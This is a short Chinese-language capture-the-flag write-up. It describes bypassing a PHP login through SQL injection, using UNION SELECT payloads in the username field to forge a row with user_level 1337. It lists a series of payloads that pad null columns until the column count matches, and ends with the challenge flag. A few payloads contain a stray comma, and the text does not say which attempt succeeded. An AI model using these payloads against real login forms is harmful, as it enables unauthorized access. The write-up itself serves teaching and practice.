# Injection 2
給你php原始碼，要你使用injection登入，hint說：創造一個假的query結果，於是想到UNION。要拿到flag的關鍵語句：
 1. SELECT返回結果只能有1個才能進入給flag的程式碼
 2. 表格user的attribute: user_level要>=1337

於是, 使用：
 * username = hehe' UNION SELECT 'hehe' as username, '123' as password, 1337 as user_level#
 * password = 123

登入，可是登入失敗，原因是UNION後面加的SELECT和前面的SELECT的column沒對到，可能是數目不對或是順序不對，試試加一個column：
 * username = hehe' UNION SELECT null, 'hehe' as username, '123' as password, 1337 as user_level#
 * username = hehe' UNION SELECT 'hehe' as username, null, '123' as password, 1337 as user_level#
 * username = hehe' UNION SELECT 'hehe' as username, '123' as password, null, 1337 as user_level#
 * username = hehe' UNION SELECT 'hehe' as username, '123' as password, 1337 as user_level, null#

全失敗，加兩個column：
 * username = hehe' UNION SELECT　null, null, 'hehe' as username, '123' as password, 1337 as user_level#
 * username = hehe' UNION SELECT null, 'hehe' as username, null, '123' as password, 1337 as user_level#
 * username = hehe' UNION SELECT null, 'hehe' as username, '123' as password, null, 1337 as user_level#
 * username = hehe' UNION SELECT null, 'hehe' as username, '123' as password, 1337 as user_level, null#
 * username = hehe' UNION SELECT, 'hehe' as username, null, null, '123' as password, 1337 as user_level#
 * username = hehe' UNION SELECT, 'hehe' as username, null, '123' as password, null, 1337 as user_level#

成功！！flag = flag_nJZAKGWYt7YfzmTsCV
